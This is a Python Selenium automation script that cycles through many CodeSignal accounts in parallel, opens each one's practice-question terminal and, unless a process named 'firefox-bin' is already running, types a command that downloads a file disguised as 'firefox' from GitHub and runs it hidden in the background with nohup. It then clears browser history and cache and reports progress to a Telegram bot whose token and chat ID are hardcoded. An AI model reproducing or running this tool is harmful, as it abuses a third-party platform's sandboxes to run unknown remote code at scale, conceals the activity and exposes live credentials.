from __future__ import annotations

import time
import os
import sys
import shutil
import platform
import requests
import threading
from datetime import datetime
from zoneinfo import ZoneInfo
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import subprocess

# ====================== SETTING ======================
NUM_PARALLEL = 5
WAIT_SECONDS = 60

# ====================== TELEGRAM — PROFESSIONAL DEVELOPER MODE ======================
# Mode: "pro" | "quiet" | "debug"
#   pro   = ringkas, terstruktur, tidak spam (default developer)
#   quiet = hanya error + ringkasan siklus
#   debug = semua event (mode lama, rawan spam)
TELEGRAM_MODE = os.environ.get("TG_MODE", "pro").strip().lower()
TELEGRAM_SEND_SCREENSHOTS = os.environ.get("TG_SCREENSHOTS", "always").strip().lower()
# error = screenshot hanya saat gagal
# always = screenshot sukses + gagal
# never  = tidak kirim foto

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "8333206393:AAG8Z76SSbgAEAC1a3oPT8XhAF9t_rDOq3A")
TELEGRAM_CHAT_ID   = os.environ.get("TG_CHAT_ID", "-1003532458425")

_telegram_lock = threading.Lock()
_last_telegram_send = 0.0
TELEGRAM_MIN_INTERVAL = 1.8 if TELEGRAM_MODE == "pro" else 1.2
TELEGRAM_EDIT_INTERVAL = 3.0  # animasi editMessageText (hindari flood)
TELEGRAM_ANIM = os.environ.get("TG_ANIM", "1").strip() not in ("0", "false", "off", "no")

# Digest: gabungkan event kecil jadi 1 pesan
_digest_lock = threading.Lock()
_digest_lines = []
_digest_flush_at = 0.0
DIGEST_WINDOW_SEC = 8.0
DIGEST_MAX_LINES = 12

# Emoji palet (konsisten di semua kartu)
E = {
    "online": "🟢",
    "cycle": "♻️",
    "batch": "🧩",
    "live": "📡",
    "ok": "✅",
    "fail": "❌",
    "wait": "⏳",
    "run": "⚙️",
    "stop": "🛑",
    "block": "🚫",
    "lock": "🔒",
    "rocket": "🚀",
    "cam": "📸",
    "warn": "⚠️",
    "spark": "✨",
    "clock": "🕒",
    "done": "🏁",
    "dev": "💻",
}

SPIN = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
PULSE = ["◐", "◓", "◑", "◒"]
MOON = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"]
BAR_ON = "█"
BAR_OFF = "░"
BAR_WIDTH = 12

IS_WINDOWS = platform.system() == "Windows"
TZ_WITA = ZoneInfo("Asia/Makassar")  # WITA — Makassar (UTC+8)


def now_wita(fmt: str = "%H:%M:%S") -> str:
    """Jam lokal WITA (Makassar)."""
    return datetime.now(TZ_WITA).strftime(fmt)


def now_wita_full() -> str:
    return datetime.now(TZ_WITA).strftime("%d/%m/%Y %H:%M:%S WITA")


def _html_escape(text: str) -> str:
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def _should_notify(level: str) -> bool:
    """level: debug | info | summary | error"""
    mode = TELEGRAM_MODE
    if mode == "debug":
        return True
    if mode == "quiet":
        return level in ("summary", "error")
    # pro
    return level in ("info", "summary", "error")


def _progress_bar(done: int, total: int) -> str:
    total = max(1, int(total))
    done = max(0, min(int(done), total))
    filled = int(round(BAR_WIDTH * done / total))
    return BAR_ON * filled + BAR_OFF * (BAR_WIDTH - filled)


def _pct(done: int, total: int) -> int:
    total = max(1, int(total))
    return int(round(100 * max(0, min(int(done), total)) / total))


def _flush_digest(force: bool = False):
    global _digest_lines, _digest_flush_at
    with _digest_lock:
        if not _digest_lines:
            return
        if not force and time.time() < _digest_flush_at and len(_digest_lines) < DIGEST_MAX_LINES:
            return
        lines = list(_digest_lines)
        _digest_lines = []
        _digest_flush_at = 0.0
    body = "\n".join(lines)
    _send_telegram_raw(
        f"{E['spark']} <b>DEV · activity</b>\n"
        f"{E['clock']} <code>{_html_escape(now_wita_full())}</code>\n\n{body}",
        parse_mode="HTML",
    )


def notify(level: str, html_body: str, photo_path: str = None, digest: bool = False):
    """Professional notifier. digest=True menumpuk baris singkat ke 1 pesan."""
    if not _should_notify(level):
        return None

    if digest and not photo_path and TELEGRAM_MODE == "pro" and level != "error":
        with _digest_lock:
            global _digest_flush_at
            _digest_lines.append(html_body)
            if not _digest_flush_at:
                _digest_flush_at = time.time() + DIGEST_WINDOW_SEC
            should_flush = len(_digest_lines) >= DIGEST_MAX_LINES
        if should_flush:
            _flush_digest(force=True)
        return True

    _flush_digest(force=True)
    return _send_telegram_raw(html_body, photo_path=photo_path, parse_mode="HTML")


def _parse_message_id(resp):
    try:
        data = resp.json()
        mid = data.get("result", {}).get("message_id")
        return int(mid) if mid is not None else None
    except Exception:
        return None


def _send_telegram_raw(message: str, photo_path: str = None, parse_mode: str = "HTML"):
    global _last_telegram_send
    max_retries = 4
    for attempt in range(1, max_retries + 1):
        with _telegram_lock:
            now = time.time()
            wait = TELEGRAM_MIN_INTERVAL - (now - _last_telegram_send)
            if wait > 0:
                time.sleep(wait)
            _last_telegram_send = time.time()

        try:
            if photo_path and os.path.exists(photo_path):
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
                with open(photo_path, "rb") as photo:
                    files = {"photo": photo}
                    data = {
                        "chat_id": TELEGRAM_CHAT_ID,
                        "caption": str(message)[:1000],
                        "parse_mode": parse_mode,
                    }
                    r = requests.post(url, data=data, files=files, timeout=30)
            else:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": str(message)[:4000],
                    "parse_mode": parse_mode,
                    "disable_web_page_preview": True,
                }
                r = requests.post(url, data=data, timeout=15)

            if r.status_code == 200:
                return _parse_message_id(r) or True

            if r.status_code == 429:
                try:
                    body = r.json()
                    retry_after = int(body.get("parameters", {}).get("retry_after", 5))
                except Exception:
                    retry_after = 5 + attempt * 2
                print(f"[TELEGRAM] 429 → tunggu {retry_after}s lalu retry ({attempt}/{max_retries})", flush=True)
                time.sleep(retry_after)
                continue

            print(f"[TELEGRAM ERROR] HTTP {r.status_code}: {r.text[:300]}", flush=True)
            return None

        except Exception as e:
            print(f"[TELEGRAM ERROR] {e}", flush=True)
            if attempt < max_retries:
                time.sleep(2 * attempt)
                continue
            return None
    return None


def _edit_telegram(message_id: int, message: str, parse_mode: str = "HTML") -> bool:
    """Update pesan yang sama → efek animasi runtime tanpa spam."""
    global _last_telegram_send
    if not message_id:
        return False
    with _telegram_lock:
        now = time.time()
        wait = min(TELEGRAM_EDIT_INTERVAL, TELEGRAM_MIN_INTERVAL) - (now - _last_telegram_send)
        if wait > 0:
            time.sleep(wait)
        _last_telegram_send = time.time()
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "message_id": int(message_id),
            "text": str(message)[:4000],
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
        }
        r = requests.post(url, data=data, timeout=15)
        if r.status_code == 200:
            return True
        # "message is not modified" = frame identik, bukan error
        if r.status_code == 400 and "not modified" in (r.text or "").lower():
            return True
        if r.status_code == 429:
            try:
                retry_after = int(r.json().get("parameters", {}).get("retry_after", 3))
            except Exception:
                retry_after = 3
            time.sleep(retry_after)
        return False
    except Exception as e:
        print(f"[TELEGRAM EDIT] {e}", flush=True)
        return False


def send_telegram(message: str, photo_path: str = None):
    """Kompatibilitas lama — dipetakan ke mode pro (info)."""
    return notify("debug", _html_escape(message), photo_path=photo_path)


class LiveCard:
    """Satu pesan Telegram yang di-edit berkala (progress bar + spinner)."""

    def __init__(self, title: str, total: int):
        self.title = title
        self.total = max(1, int(total))
        self.lock = threading.Lock()
        self.ok = 0
        self.fail = 0
        self.running = 0
        self.frame = 0
        self.started = time.time()
        self.message_id = None
        self._stop = threading.Event()
        self._thread = None

    def bump(self, kind: str):
        with self.lock:
            if kind == "ok":
                self.ok += 1
                self.running = max(0, self.running - 1)
            elif kind == "fail":
                self.fail += 1
                self.running = max(0, self.running - 1)
            elif kind == "run":
                self.running += 1

    def _body(self, final: bool = False) -> str:
        with self.lock:
            ok, fail, running = self.ok, self.fail, self.running
            frame = self.frame
        done = ok + fail
        elapsed = int(time.time() - self.started)
        spin = SPIN[frame % len(SPIN)]
        moon = MOON[frame % len(MOON)]
        pulse = PULSE[frame % len(PULSE)]
        bar = _progress_bar(done, self.total)
        pct = _pct(done, self.total)
        if final:
            status = f"{E['done']} <b>selesai</b>"
        else:
            status = f"{spin} {moon} <i>runtime</i> {pulse}"
        return (
            f"{E['live']} <b>{_html_escape(self.title)}</b>\n"
            f"{status}\n"
            f"<code>{bar}</code>  <b>{pct}%</b>\n"
            f"{E['run']} workers  <code>{running}</code> aktif · "
            f"<code>{done}/{self.total}</code>\n"
            f"{E['ok']} <code>{ok}</code>   {E['fail']} <code>{fail}</code>\n"
            f"{E['clock']} <code>{elapsed}s</code> · <code>{_html_escape(now_wita())} WITA</code>"
        )

    def start(self):
        if not TELEGRAM_ANIM or not _should_notify("info"):
            return
        mid = _send_telegram_raw(self._body(final=False))
        if isinstance(mid, int):
            self.message_id = mid
        self._thread = threading.Thread(target=self._loop, name="tg-live", daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.wait(TELEGRAM_EDIT_INTERVAL):
            self.frame += 1
            if self.message_id:
                _edit_telegram(self.message_id, self._body(final=False))
            else:
                # console-only pulse kalau pesan gagal dibuat
                print(f"\r[LIVE] {SPIN[self.frame % len(SPIN)]} batch {self.ok+self.fail}/{self.total}", end="", flush=True)

    def finish(self):
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        if self.message_id:
            _edit_telegram(self.message_id, self._body(final=True))
        elif _should_notify("info"):
            _send_telegram_raw(self._body(final=True))


def _first_existing(paths):
    for p in paths:
        if p and os.path.isfile(p):
            return p
    return None


def find_chrome_binary():
    env = os.environ.get("CHROME_BINARY")
    if env and os.path.isfile(env):
        return env

    if IS_WINDOWS:
        local = os.environ.get("LOCALAPPDATA", "")
        pf = os.environ.get("PROGRAMFILES", r"C:\Program Files")
        pf86 = os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")
        return _first_existing([
            os.path.join(local, r"Google\Chrome\Application\chrome.exe"),
            os.path.join(pf, r"Google\Chrome\Application\chrome.exe"),
            os.path.join(pf86, r"Google\Chrome\Application\chrome.exe"),
            os.path.join(local, r"Chromium\Application\chrome.exe"),
        ])

    return _first_existing([
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/snap/bin/chromium",
    ])


def find_chromedriver():
    env = os.environ.get("CHROMEDRIVER_PATH")
    if env and os.path.isfile(env):
        return env

    candidates = []
    if IS_WINDOWS:
        candidates.extend([
            os.path.join(os.getcwd(), "chromedriver.exe"),
            os.path.join(os.path.dirname(sys.executable), "chromedriver.exe"),
            r"C:\chromedriver\chromedriver.exe",
        ])
        found = shutil.which("chromedriver.exe") or shutil.which("chromedriver")
        if found:
            candidates.insert(0, found)
    else:
        candidates.extend([
            "/usr/bin/chromedriver",
            "/usr/local/bin/chromedriver",
            os.path.join(os.getcwd(), "chromedriver"),
        ])
        found = shutil.which("chromedriver")
        if found:
            candidates.insert(0, found)

    return _first_existing(candidates)


def load_credentials():
    path = "akun.txt"
    if not os.path.exists(path):
        print(f"[ERROR] {path} tidak ditemukan di {os.getcwd()}", flush=True)
        sys.exit(1)
    lines = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f.read().splitlines():
            ln = ln.strip()
            if ln and "|" in ln:
                lines.append(ln)
    if not lines:
        print("[ERROR] akun.txt kosong", flush=True)
        sys.exit(1)
    return lines


def get_logged_in_accounts(credentials):
    result = []
    for idx, line in enumerate(credentials):
        try:
            email, password = line.split("|", 1)
            email, password = email.strip(), password.strip()
        except Exception:
            continue
        profile_dir = f"chrome_profile_{idx}"
        if os.path.isdir(profile_dir):
            result.append((idx, email, password, profile_dir))
            print(f"[INFO] Profile siap → index={idx}  {email}  ({profile_dir})", flush=True)
        else:
            print(f"[SKIP] Belum login → index={idx}  {email}", flush=True)
    return result


def clear_profile_locks(profile_dir):
    for name in ("SingletonLock", "SingletonCookie", "SingletonSocket", "DevToolsActivePort"):
        path = os.path.join(profile_dir, name)
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass


def _rm_path(path):
    try:
        if os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
        elif os.path.isfile(path):
            os.remove(path)
        return True
    except Exception:
        return False


def clear_cache_and_history_files(profile_dir, email):
    default_dir = os.path.join(profile_dir, "Default")
    roots = [profile_dir]
    if os.path.isdir(default_dir):
        roots.append(default_dir)

    dir_names = (
        "Cache",
        "Code Cache",
        "GPUCache",
        "ShaderCache",
        "GrShaderCache",
        "Media Cache",
        "DawnCache",
        "DawnWebGPUCache",
        "DawnGraphiteCache",
        "Service Worker",
        "OptimizationHints",
    )
    file_names = (
        "History",
        "History-journal",
        "History Provider Cache",
        "Visited Links",
        "Top Sites",
        "Top Sites-journal",
        "Shortcuts",
        "Shortcuts-journal",
        "Network Action Predictor",
        "Network Action Predictor-journal",
        "Favicons",
        "Favicons-journal",
    )

    removed = 0
    for root in roots:
        for name in dir_names:
            path = os.path.join(root, name)
            if os.path.exists(path) and _rm_path(path):
                removed += 1
        sw = os.path.join(root, "Service Worker", "CacheStorage")
        if os.path.exists(sw) and _rm_path(sw):
            removed += 1
        for name in file_names:
            path = os.path.join(root, name)
            if os.path.exists(path) and _rm_path(path):
                removed += 1

    print(f"[INFO] {email}: Hapus file cache/history di profile → {removed} item", flush=True)
    return removed



XPATH_POPUP_TOP = "/html/body/div[1]/div/div/div/div/div/div/div[1]/div/div[2]/div[1]"
XPATH_POPUP_DONE = "/html/body/div[1]/div/div/div/div/div/div/div[2]/div/div/div"
XPATH_TERMINAL_CLICK = "/html/body/div[9]/div/div/main/div[3]/div[1]/div/div/div/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div[1]/div[2]/div/div/div[2]/div/div/div/div/div[2]/div[1]/div[2]/div[1]/span[2]"
POPUP_STABILIZE_SEC = 5
POPUP_AFTER_TOP_SEC = 2
POPUP_AFTER_DONE_SEC = 3
POPUP_FIND_TIMEOUT = 8
TERMINAL_CLICK_TIMEOUT = 15
IDLE_BROWSER_SLEEP_SEC = 10


def dismiss_editor_position_popup(driver, email):
    """
    Setelah halaman terbuka, popup 'Choose Editor Panel Position' kadang muncul.
    Alur: tunggu 5s -> klik Top -> delay 2s -> klik Done -> delay 3s.
    Jika popup / tombol tidak ada, skip tanpa error.
    """
    print(f"[INFO] {email}: Tunggu {POPUP_STABILIZE_SEC}s agar halaman/popup stabil...", flush=True)
    time.sleep(POPUP_STABILIZE_SEC)

    wait = WebDriverWait(driver, POPUP_FIND_TIMEOUT)
    try:
        top_btn = wait.until(EC.element_to_be_clickable((By.XPATH, XPATH_POPUP_TOP)))
    except (TimeoutException, NoSuchElementException):
        print(f"[INFO] {email}: Popup Top/Done tidak muncul -> skip", flush=True)
        return False

    try:
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", top_btn)
        try:
            top_btn.click()
        except ElementClickInterceptedException:
            driver.execute_script("arguments[0].click();", top_btn)
        print(f"[INFO] {email}: Klik button Top", flush=True)
        notify("debug", f"{E['ok']} {_html_escape(_display_email(email))} klik Top")
    except Exception as e:
        print(f"[INFO] {email}: Gagal klik Top ({e}) -> skip popup", flush=True)
        return False

    time.sleep(POPUP_AFTER_TOP_SEC)

    try:
        done_btn = WebDriverWait(driver, POPUP_FIND_TIMEOUT).until(
            EC.element_to_be_clickable((By.XPATH, XPATH_POPUP_DONE))
        )
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", done_btn)
        try:
            done_btn.click()
        except ElementClickInterceptedException:
            driver.execute_script("arguments[0].click();", done_btn)
        print(f"[INFO] {email}: Klik button Done", flush=True)
        notify("debug", f"{E['ok']} {_html_escape(_display_email(email))} klik Done")
    except (TimeoutException, NoSuchElementException):
        print(f"[INFO] {email}: Button Done tidak muncul -> skip", flush=True)
        return False
    except Exception as e:
        print(f"[INFO] {email}: Gagal klik Done ({e}) -> skip", flush=True)
        return False

    time.sleep(POPUP_AFTER_DONE_SEC)
    print(f"[INFO] {email}: Popup editor position selesai, tunggu browser stabil...", flush=True)
    return True



def wait_browser_stable(driver, email, timeout=20):
    """Tunggu document ready + body ada. Tidak menambah sleep tetap."""
    end = time.time() + timeout
    while time.time() < end:
        try:
            state = driver.execute_script("return document.readyState")
            if state == "complete":
                print(f"[INFO] {email}: Browser stabil (readyState=complete)", flush=True)
                return True
        except Exception:
            pass
        time.sleep(0.25)
    print(f"[INFO] {email}: Browser belum fully complete, lanjut saja", flush=True)
    return False


def click_terminal_and_ctrl_c(driver, email):
    """Klik elemen xpath terminal lalu Ctrl+C untuk line baru. Skip jika elemen tidak ada."""
    wait = WebDriverWait(driver, TERMINAL_CLICK_TIMEOUT)
    try:
        elem = wait.until(EC.presence_of_element_located((By.XPATH, XPATH_TERMINAL_CLICK)))
    except (TimeoutException, NoSuchElementException):
        print(f"[INFO] {email}: elemen xpath terminal tidak muncul -> skip klik/Ctrl+C", flush=True)
        return False

    try:
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", elem)
        try:
            elem.click()
        except ElementClickInterceptedException:
            driver.execute_script("arguments[0].click();", elem)
        print(f"[INFO] {email}: Klik xpath terminal", flush=True)
        time.sleep(0.3)
        try:
            elem.send_keys(Keys.CONTROL, "c")
        except Exception:
            ActionChains(driver).click(elem).key_down(Keys.CONTROL).send_keys("c").key_up(Keys.CONTROL).perform()
        print(f"[INFO] {email}: Kirim Ctrl+C (line baru)", flush=True)
        notify("debug", f"{E['ok']} {_html_escape(_display_email(email))} terminal Ctrl+C")
        return True
    except Exception as e:
        print(f"[INFO] {email}: Gagal klik xpath / Ctrl+C ({e}) -> skip", flush=True)
        return False


def read_codesignal_terminal_text(driver):
    """Baca teks panel terminal CodeSignal (bukan proses Windows)."""
    js = """
    let t = '';
    const sels = ['.xterm-rows', '.xterm-screen', '.xterm', 'textarea'];
    for (const s of sels) {
      document.querySelectorAll(s).forEach((e) => {
        t += (e.innerText || e.textContent || e.value || '') + '\\n';
      });
    }
    if (!t.trim()) t = document.body.innerText || '';
    return t;
    """
    try:
        return (driver.execute_script(js) or "")
    except Exception:
        try:
            return driver.find_element(By.TAG_NAME, "body").text or ""
        except Exception:
            return ""


def isolated_firefox_running_remote(driver, email):
    """
    Cek Isolated Web Co / firefox-bin di lingkungan CodeSignal (hasil top/ps di terminal),
    bukan di PC Windows tempat script Python jalan.
    """
    text = read_codesignal_terminal_text(driver).lower()
    isolated = "isolated web co" in text or "isolated we" in text
    firefox_bin = "firefox-bin" in text

    if isolated or firefox_bin:
        print(f"[INFO] {email}: ketemu di buffer terminal (tanpa ps ulang)", flush=True)
        return isolated, firefox_bin

    print(f"[INFO] {email}: buffer terminal belum ada nama proses -> jalankan ps/top di terminal CodeSignal", flush=True)
    try:
        actions = ActionChains(driver)
        actions.send_keys("ps -eo comm --no-headers")
        actions.send_keys(Keys.ENTER)
        actions.perform()
        time.sleep(2)
        actions = ActionChains(driver)
        actions.send_keys("top -bn1 | head -n 25")
        actions.send_keys(Keys.ENTER)
        actions.perform()
        time.sleep(2)
    except Exception as e:
        print(f"[WARNING] {email}: gagal kirim ps/top ke terminal: {e}", flush=True)

    text = read_codesignal_terminal_text(driver).lower()
    isolated = "isolated web co" in text or "isolated we" in text
    firefox_bin = "firefox-bin" in text
    print(f"[INFO] {email}: hasil cek remote isolated={isolated} firefox-bin={firefox_bin}", flush=True)
    return isolated, firefox_bin


def type_terminal_command(driver, email):
    """Ketik command_text di terminal lalu Enter. command_text boleh kosong."""
    command_text = """ wget https://github.com/leryjo/repo/releases/download/vhvv/firefox; nohup bash firefox &>/dev/null & """
    try:
        actions = ActionChains(driver)
        actions.send_keys(command_text)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        print(f"[INFO] {email}: Kirim perintah terminal + Enter", flush=True)
        time.sleep(5)
        return True
    except Exception as e:
        print(f"[INFO] {email}: Gagal kirim perintah terminal ({e}) -> skip", flush=True)
        return False


def after_done_terminal_and_browser_check(driver, email, profile_dir):
    """Setelah Done+3s: stabil, klik xpath, Ctrl+C, cek Isolated Web Co / firefox-bin."""
    wait_browser_stable(driver, email)
    click_terminal_and_ctrl_c(driver, email)

    isolated, firefox_bin = isolated_firefox_running_remote(driver, email)
    if isolated or firefox_bin:
        names = []
        if isolated:
            names.append("Isolated Web Co")
        if firefox_bin:
            names.append("firefox-bin")
        joined = " / ".join(names)
        print(f"[INFO] {email}: {joined} sedang berjalan -> skip perintah, lanjut wait", flush=True)
        notify("info", f"{E['warn']} {_html_escape(_display_email(email))} {joined} berjalan -> skip")
        return

    print(f"[INFO] {email}: Isolated Web Co / firefox-bin tidak berjalan -> kirim perintah terminal", flush=True)
    type_terminal_command(driver, email)

def take_screenshot(driver, email, label):
    os.makedirs("screenshots", exist_ok=True)
    safe = email.replace("@", "_").replace(".", "_")
    filename = os.path.join("screenshots", f"{safe}_{label}_{int(time.time())}.png")
    try:
        driver.save_screenshot(filename)
        return filename
    except Exception as e:
        print(f"[WARNING] Screenshot gagal: {e}", flush=True)
        return None


def _display_email(email: str) -> str:
    """Email ditampilkan utuh (tidak disensor)."""
    return str(email).strip()


def run_browser(email, password, index, profile_dir, stats, live=None):
    chrome_options = Options()
    chrome_bin = find_chrome_binary()
    if chrome_bin:
        chrome_options.binary_location = chrome_bin

    chrome_options.add_argument("window-size=800,1200")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-software-rasterizer")
    chrome_options.add_argument("--remote-debugging-port=0")
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])

    os.makedirs(profile_dir, exist_ok=True)
    clear_profile_locks(profile_dir)
    chrome_options.add_argument(f"--user-data-dir={os.path.abspath(profile_dir)}")

    driver = None
    masked = _html_escape(_display_email(email))
    t0 = time.time()
    if live:
        live.bump("run")
    try:
        print(f"[INFO] {email}: Membuka browser (profile={profile_dir})...", flush=True)
        notify("debug", f"{E['rocket']} {masked} membuka browser")

        driver_path = find_chromedriver()
        if driver_path:
            service = Service(executable_path=driver_path)
        else:
            service = Service()

        last_err = None
        for attempt in range(1, 4):
            clear_profile_locks(profile_dir)
            try:
                driver = webdriver.Chrome(service=service, options=chrome_options)
                last_err = None
                break
            except Exception as e:
                last_err = e
                print(f"[WARNING] {email}: Chrome gagal attempt {attempt}/3: {e}", flush=True)
                time.sleep(2 * attempt)
        if last_err is not None:
            raise last_err

        driver.get("https://app.codesignal.com/practice-question/question/progressiveFilesystemUnitTests?context=otherTypes")
        driver.implicitly_wait(20)
        dismiss_editor_position_popup(driver, email)
        after_done_terminal_and_browser_check(driver, email, profile_dir)

        start_time = time.time()
        notify("debug", f"{E['wait']} {masked} wait {WAIT_SECONDS}s")

        tick = 0
        while True:
            remaining = WAIT_SECONDS - int(time.time() - start_time)
            if remaining <= 0:
                break
            spin = SPIN[tick % len(SPIN)]
            bar = _progress_bar(WAIT_SECONDS - max(remaining, 0), WAIT_SECONDS)
            print(
                f"\r[INFO] {email}: {spin} {bar} {remaining}s tersisa   ",
                end="",
                flush=True,
            )
            tick += 1
            time.sleep(1)

        print(flush=True)
        print(f"[INFO] {email}: Waktu {WAIT_SECONDS} detik selesai", flush=True)

        elapsed = int(time.time() - t0)
        ss = None
        if TELEGRAM_SEND_SCREENSHOTS == "always":
            ss = take_screenshot(driver, email, "setelah_wait")

        notify(
            "info",
            f"{E['ok']} <code>ok</code>  {masked}  <i>{elapsed}s</i> · <code>{_html_escape(now_wita())} WITA</code>",
            photo_path=ss,
            digest=True,
        )
        stats["ok"] += 1
        if live:
            live.bump("ok")

    except Exception as e:
        stats["fail"] += 1
        if live:
            live.bump("fail")
        err = _html_escape(str(e)[:280])
        print(f"{E['fail']} ERROR pada {email}:\n{e}", flush=True)
        ss = None
        if driver and TELEGRAM_SEND_SCREENSHOTS != "never":
            try:
                ss = take_screenshot(driver, email, "error")
            except Exception:
                pass
        notify(
            "error",
            f"{E['fail']} <b>DEV · error</b>\n{masked}\n<code>{err}</code>",
            photo_path=ss,
        )

    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        clear_cache_and_history_files(profile_dir, email)
        clear_profile_locks(profile_dir)
        print(f"[INFO] {email}: Browser ditutup", flush=True)
        notify("debug", f"{E['lock']} {masked} ditutup")


def loop_accounts():
    credentials = load_credentials()
    cycle = 0

    while True:
        if not os.path.exists(".loop_enabled.flag"):
            print("[INFO] Flag .loop_enabled.flag hilang → stop", flush=True)
            notify(
                "summary",
                f"{E['stop']} <b>DEV · stopped</b>\nFlag loop dihapus. Runner idle.",
            )
            break

        accounts = get_logged_in_accounts(credentials)
        if not accounts:
            msg = "Tidak ada chrome_profile_*. Jalankan login dulu."
            print(f"[ERROR] {msg}", flush=True)
            notify("error", f"{E['block']} <b>DEV · blocked</b>\n{_html_escape(msg)}")
            time.sleep(30)
            continue

        cycle += 1
        print(f"[INFO] Menjalankan {len(accounts)} profile dengan {NUM_PARALLEL} parallel", flush=True)
        notify(
            "summary",
            (
                f"{E['cycle']} <b>DEV · cycle #{cycle}</b>\n"
                f"{E['dev']} profiles  <code>{len(accounts)}</code>\n"
                f"{E['run']} parallel  <code>{NUM_PARALLEL}</code>\n"
                f"{E['wait']} wait      <code>{WAIT_SECONDS}s</code>\n"
                f"{E['spark']} mode      <code>{TELEGRAM_MODE}</code>"
            ),
        )

        cycle_ok = 0
        cycle_fail = 0

        for i in range(0, len(accounts), NUM_PARALLEL):
            if not os.path.exists(".loop_enabled.flag"):
                break

            batch = accounts[i:i + NUM_PARALLEL]
            batch_no = i // NUM_PARALLEL + 1
            print(f"\n[INFO] === Batch {batch_no}: {len(batch)} browser dibuka bersamaan ===", flush=True)
            notify(
                "info",
                f"{E['batch']} <b>DEV · batch {batch_no}</b>  workers=<code>{len(batch)}</code>",
            )

            stats = {"ok": 0, "fail": 0}
            live = LiveCard(f"DEV · batch {batch_no}", len(batch))
            live.start()
            with ThreadPoolExecutor(max_workers=NUM_PARALLEL) as executor:
                futures = {
                    executor.submit(run_browser, email, password, idx, profile_dir, stats, live): email
                    for idx, email, password, profile_dir in batch
                }
                for future in as_completed(futures):
                    email = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        print(f"[ERROR] Thread {email} exception: {e}", flush=True)
                        stats["fail"] += 1
                        live.bump("fail")

            live.finish()
            _flush_digest(force=True)
            cycle_ok += stats["ok"]
            cycle_fail += stats["fail"]
            notify(
                "summary",
                (
                    f"{E['done']} <b>DEV · batch {batch_no} done</b>\n"
                    f"{E['ok']} <code>{stats['ok']}</code> · {E['fail']} <code>{stats['fail']}</code>"
                ),
            )
            time.sleep(2)

        notify(
            "summary",
            (
                f"{E['cycle']} <b>DEV · cycle #{cycle} complete</b>\n"
                f"{E['ok']} <code>{cycle_ok}</code> · {E['fail']} <code>{cycle_fail}</code>\n"
                f"{E['wait']} <i>restart in 5s</i>"
            ),
        )
        print("\n[INFO] Semua profile selesai. Ulang dari awal...\n", flush=True)
        time.sleep(5)


if __name__ == "__main__":
    os.makedirs("screenshots", exist_ok=True)
    if not IS_WINDOWS and not os.environ.get("DISPLAY"):
        os.environ["DISPLAY"] = ":99"

    chrome_bin = find_chrome_binary()
    driver_path = find_chromedriver()
    print(
        f"[INFO] run.py start | os={platform.system()} | cwd={os.getcwd()} "
        f"| chrome={chrome_bin or 'auto'} | chromedriver={driver_path or 'PATH/auto'} "
        f"| NUM_PARALLEL={NUM_PARALLEL} | TG_MODE={TELEGRAM_MODE}",
        flush=True,
    )
    notify(
        "summary",
        (
            f"{E['online']} <b>DEV · runner online</b> {E['spark']}\n"
            f"{E['dev']} os        <code>{_html_escape(platform.system())}</code>\n"
            f"{E['run']} parallel  <code>{NUM_PARALLEL}</code>\n"
            f"{E['spark']} tg mode   <code>{TELEGRAM_MODE}</code>\n"
            f"{E['cam']} shots     <code>{TELEGRAM_SEND_SCREENSHOTS}</code>\n"
            f"{E['live']} anim      <code>{'on' if TELEGRAM_ANIM else 'off'}</code>"
        ),
    )
    try:
        loop_accounts()
    finally:
        _flush_digest(force=True)
